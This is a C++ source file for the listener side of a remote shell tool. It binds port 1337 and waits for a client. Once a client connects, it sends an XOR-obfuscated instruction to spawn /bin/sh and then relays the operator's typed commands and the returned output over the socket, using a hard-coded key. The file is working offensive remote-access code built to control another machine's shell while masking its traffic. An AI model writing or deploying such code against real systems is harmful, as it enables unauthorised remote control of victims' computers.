#include<iostream>
#include<thread>
#include<string>
#include<cstring>
#include<csignal>
#include<unistd.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<netinet/in.h>
#include<netdb.h>

//beej guide network programming
void *get_int_addr(struct sockaddr *sa){
	if(sa->sa_family == AF_INET){
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}
	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

class Server{
	private:
		int sckMainSocket = -1, iLocalPort;
		std::string strPassword = "";
	public:
		Server() : iLocalPort(1337), strPassword("password") {}
		Server(int iPort) : iLocalPort(iPort), strPassword("password") {}
		Server(std::string strPass) : iLocalPort(1337), strPassword(strPass) {}
		Server(int iPort, std::string strPass) : iLocalPort(iPort), strPassword(strPass) {}

		bool isShellRunning = false;
		
		int sckInit();
		int WaitConnection();
		void SpawnShell(const char*, int);
		std::string Xor(const std::string);
		
		void threadReceiveRemoteOutput(int);
};

void Server::SpawnShell(const char* cCmdLine, int iClientSck){
	std::string strCommandLine = "xx";
	strCommandLine.append(cCmdLine);
	std::string strOut = Xor(strCommandLine);
	int iLen = strOut.length();
	if(send(iClientSck, strOut.c_str(), iLen, 0) <= 0){
		std::cout<<"Unable to send command to client\n";
		return;
	}
	//Wait client confirmation
	char cCmdBuffer[5];
	memset(cCmdBuffer, 0, 5);
	if(recv(iClientSck, cCmdBuffer, 4, 0) <= 0){
		std::cout<<"Unable to receive response from client\n";
		return;
	}
	strCommandLine = Xor(std::string(cCmdBuffer));
	if(strCommandLine[0] == 'x' && strCommandLine[1] == 'x' && strCommandLine[2] == '1'){
		//Confirmed
		isShellRunning = true;
		std::thread th1(&Server::threadReceiveRemoteOutput, this, iClientSck);
		char cCmdLine[1024];
		std::string strInput = "";
		while(isShellRunning){
			memset(cCmdLine, 0, 1024);
			fgets(cCmdLine, 1024, stdin);
			strInput = Xor(std::string(cCmdLine));
			iLen = strInput.length();
			if(send(iClientSck, strInput.c_str(), iLen, 0) <= 0){
				isShellRunning = false;
				std::cout<<"Unable to send command to client\n";
				break;
			}
		}
		th1.join();
	} else {
		std::cout<<"Unable to spawn remote shell\n";
		return;
	}
	
}

std::string Server::Xor(const std::string strMessage){
	std::string strFinal = "";
	for(char mC : strMessage){
		for(char xC : strPassword){
			mC ^= xC;
		}
		strFinal.append(1, mC);
	}
	return strFinal;
}

void Server::threadReceiveRemoteOutput(int iSocket){
	char cCmdBuffer[1025];
	int iBytes = 0;
	while(isShellRunning){
		iBytes = recv(iSocket, cCmdBuffer, 1024, 0);
		if(iBytes > 0){
			cCmdBuffer[iBytes] = '\0';
			std::string strOutput = Xor(std::string(cCmdBuffer));
			std::cout<<strOutput;
		} else if(iBytes == -1){
			std::cout<<"Socket error\n";
			break;
		}
	}
}

int Server::WaitConnection(){
	char strIP[INET6_ADDRSTRLEN];
	int sckTmpSocket;
	struct sockaddr_storage strctClient;
	socklen_t slC = sizeof(strctClient);
	sckTmpSocket = accept(sckMainSocket, (struct sockaddr *)&strctClient, &slC);
	if(sckTmpSocket != -1){
		inet_ntop(strctClient.ss_family, get_int_addr((struct sockaddr *)&strctClient),strIP, sizeof(strIP));
		std::cout<<"New connection from "<<strIP<<'\n';
	}
	return sckTmpSocket;
}

int Server::sckInit(){
	int iStat = 0, iYes = 1;
	const char *cLocalPort = std::string(std::to_string(iLocalPort)).c_str();
	struct addrinfo strctAd, *strctP, *strctServer;
	memset(&strctAd, 0, sizeof(strctAd));
	strctAd.ai_family = AF_UNSPEC;
	strctAd.ai_socktype = SOCK_STREAM;
	strctAd.ai_flags = AI_PASSIVE;
	if((iStat = getaddrinfo(nullptr, cLocalPort, &strctAd, &strctServer)) != 0){
		std::cout<<"Error getaddrinfo\n";
		return false;
	}
	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
		if((sckMainSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
			continue;
		}
		if(setsockopt(sckMainSocket, SOL_SOCKET, SO_REUSEADDR, &iYes, sizeof(int)) == -1){
			std::cout<<"setsockopt error\n";
			return false;
		}
		if(bind(sckMainSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
			continue;
		}
		break;
	}
	freeaddrinfo(strctServer);
	if(listen(sckMainSocket, 1) == -1){
		std::cout<<"Error listening\n";
		return false;
	}
	if(sckMainSocket == -1 || strctP == nullptr){
		return false;
	}
	return true;
}

int main(){
	Server *Srv = new Server(1337, "$up3rP@sSw0rD");
	if(Srv->sckInit() != -1){
		std::cout<<"Waiting for incomming connection\n";
		int sckTmp = Srv->WaitConnection();
		if(sckTmp != -1){
			Srv->SpawnShell("/bin/sh", sckTmp);
		}
	}
	delete Srv;
	Srv = nullptr;
	return 0;
}
